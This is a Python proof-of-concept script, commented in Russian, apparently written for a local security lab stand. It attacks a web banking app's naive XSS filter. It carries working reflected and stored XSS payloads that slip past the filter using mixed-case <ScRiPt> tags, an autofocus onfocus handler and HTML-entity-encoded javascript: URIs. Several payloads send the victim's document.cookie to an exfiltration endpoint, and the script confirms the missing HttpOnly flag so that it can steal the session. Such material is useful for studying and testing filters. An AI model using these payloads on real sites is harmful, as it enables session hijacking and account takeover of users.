#!/usr/bin/env python3
"""
stage_xss.py — «Через браузер жертвы»: обход sanitizeSearchDisplay и кража сессии.

    python3 poc/stage_xss.py

Стенд должен быть поднят: docker compose up -d --build

Фильтр sanitizeSearchDisplay (render.go) вырезает ровно пять строк в нижнем
регистре: script, onerror, javascript:, onload, onmouseover. Он стоит в двух
местах: поиск в истории (/history?q=, handlers_money.go:60) и комментарий
чаевых (handlers_money.go:292). Обходятся регистром, событиями вне списка
и HTML-сущностями. Оба стока выводят HTML как есть (template.HTML),
кука без HttpOnly (auth.go:59) — сессия уходит целиком.
"""
from lib import *  # noqa: F401,F403

EXFIL = "http://127.0.0.1:9999/?"  # куда уходит document.cookie у жертвы


def history_search(client, payload, desc):
    """GET /history?q=<payload> — возвращает ответ целиком."""
    return req(desc, "/history", client=client, params={"q": payload})


def main():
    step("1. вход под рабочей учёткой")
    client = login_as("ivanov", "workplace1")
    if not client:
        fail("не удалось войти, стенд поднят?")
        return 1
    ok("сессия получена")

    step("2. OW-12: что фильтр реально делает: строчный <script> вырезается")
    say("sanitizeSearchDisplay ищет 'script' через strings.Index — с регистром.",
        "Обычный <script> в ответе превращается в <>, содержимое остаётся мусором:")
    baseline = "<script>alert(1)</script>"
    r = history_search(client, baseline,
                       "GET /history?q=%s  (эталон: должно быть вырезано)" % baseline)
    if "<script>" in r:
        fail("script прошёл — фильтр не работает вообще")
    else:
        m = r.search(r"Результаты по запросу: <span>(.*?)</span>")
        artifact("OW-12 · контроль фильтра пропускает небезопасный вывод",
                 "GET /history?q=<script>… → HTTP %s" % r.status,
                 "в сохранённом фрагменте <script> удалён наивной фильтрацией; сырая строка выводится через QRaw")
        ok("строчный script вырезан, в строке осталось: %s"
           % (re.sub(r"<[^>]*>", "", m.group(1)) if m else ""))

    step("3. OW-12: обход регистром: <ScRiPt> доходит до жертвы как есть")
    say("strings.Index чувствителен к регистру, а теги в HTML — нет. Смешанный",
        "регистр не встречается со списком ни в одном месте, фильтр не трогает",
        "строку, и браузер жертвы такой тег исполняет:")
    payload = '<ScRiPt>new Image().src="%s"+document.cookie</ScRiPt>' % EXFIL
    r = history_search(client, payload, "GET /history?q=<ScRiPt>... (обход по регистру)")
    if payload in r:
        artifact("OW-12 · XSS через mixed-case tag отражён без экранирования",
                 "GET /history?q=<ScRiPt>… → HTTP %s" % r.status,
                 "HTML payload в ответе: %s" % payload)
        ok("payload в ответе байт в байт, экранирования нет: %s" % payload)
    else:
        fail("payload исказился")

    step("4. OW-12: обход событием, которого нет в списке")
    say("В списке onerror, onload, onmouseover. Событие onfocus оттуда отсутствует",
        "и не вырезается вообще — плюс autofocus запускает его без действий жертвы:")
    payload2 = '<input autofocus onfocus=new Image().src="%s"+document.cookie>' % EXFIL
    r = history_search(client, payload2,
                       "GET /history?q=<input autofocus onfocus=...>  (onfocus не в "
                       "чёрном списке)")
    if payload2 in r:
        artifact("OW-12 · событие вне denylist отражено без экранирования",
                 "GET /history?q=<input autofocus onfocus=…> → HTTP %s" % r.status,
                 "ответ содержит: %s" % payload2)
        ok("событие вне списка прошло целиком")
    else:
        fail("payload исказился")

    step("5. OW-12: обход HTML-сущностью: javascript: пишем через сущности")
    say("Фильтр ищет буквальную строку 'javascript:', и заодно в ней есть подстрока",
        "'script' — то есть вырезается она целиком, даже если заменить буквы на",
        "сущности, надо ломать и 'script'. В атрибутах браузер декодирует сущности",
        "уже после фильтра, поэтому в исходнике нет ни одной запрещённой строки, а",
        "схема в браузере собирается заново:")
    payload3 = '<iframe src="&#106;ava&#115;cript:alert(document.cookie)"></iframe>'
    r = history_search(client, payload3,
                       "GET /history?q=<iframe src=&#106;ava&#115;cript:...>  "
                       "(сущности вместо j и s)")
    if payload3 in r:
        artifact("OW-12 · HTML entities проходят фильтр и остаются в ответе",
                 "GET /history?q=<iframe src=entities> → HTTP %s" % r.status,
                 "HTML payload в ответе: %s" % payload3)
        ok("javascript: через сущности прошёл фильтр")
    else:
        fail("payload исказился")

    step("6. OW-12: сохранённый XSS в чаевых: живёт в базе и открывается потом")
    say("Тот же фильтр стоит на комментарии чаевых (handlers_money.go:292), поэтому",
        "обход тот же. Чаевые отправляем себе — проверки на себя нет, деньги в итоге",
        "возвращаются на тот же счёт. Сохранённый payload открывается жертвой позже,",
        "по ссылке /tips/received?id=N, и там он выводится как template.HTML (строка 344):")
    payload4 = '<ScRiPt>new Image().src="%s"+document.cookie</ScRiPt>' % EXFIL
    req("POST /tips/new  recipient=ivanov amount_rub=10 comment=<ScRiPt>...",
        "/tips/new", client=client,
        data={"recipient": "ivanov", "amount_rub": "10", "comment": payload4})
    r = req("GET /tips/received  (ищем id своего чаевого)", "/tips/received",
            client=client)
    m = r.search(r"/tips/received\?id=(\d+)")
    if not m:
        fail("чаевые не сохранились")
        return 1
    tip = m.group(1)
    r = req("GET /tips/received?id=%s  (карточка, Template.HTML без экранирования)"
            % tip, "/tips/received", client=client, params={"id": tip})
    if payload4 in r:
        tip_body = db("SELECT memo FROM operations WHERE id=%s" % tip)
        artifact("OW-12 · сохранённый XSS лежит в БД и возвращается карточкой",
                 "operations.id=%s memo=%s" % (tip, tip_body),
                 "GET /tips/received?id=%s → HTTP %s; payload не экранирован" % (tip, r.status))
        ok("сохранённый payload лежит в карточке без экранирования: "
           "/tips/received?id=%s" % tip)
    else:
        fail("payload в карточке не нашёлся")

    step("7. OW-30: кука без HttpOnly: сессия читается из JavaScript")
    say("Всё предыдущее имеет смысл только потому, что в cookie нет флага HttpOnly",
        "(auth.go:59) — значит document.cookie отдаёт ow_session целиком, без",
        "дополнительных дыр. Смотрим заголовок при входе:")
    fresh = login_as("ivanov", "workplace1")
    if not fresh:
        fail("повторный вход не прошёл")
        return 1
    for line in set_cookie_lines(fresh):
        info("Set-Cookie: %s" % line)
    if fresh.has_httponly():
        fail("HttpOnly вдруг стоит — куку из JS не украсть")
    else:
        artifact("OW-30 · ow_session без HttpOnly",
                 *["Set-Cookie: %s" % line for line in set_cookie_lines(fresh)],
                 "HttpOnly flag = absent; document.cookie сможет прочитать сессионный токен")
        ok("HttpOnly отсутствует: украденная кука = полная сессия жертвы")

    say("Итог цепочки: жертва открывает ссылку /history?q=<ScRiPt>... (или карточку",
        "чаевых) → скрипт исполняется в её браузере → document.cookie с ow_session",
        "уходит атакующему → всё, что умеет жертва, включая её роль. Здесь мы",
        "фиксим, что фильтр пропускает payload и что кука читается из JS.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
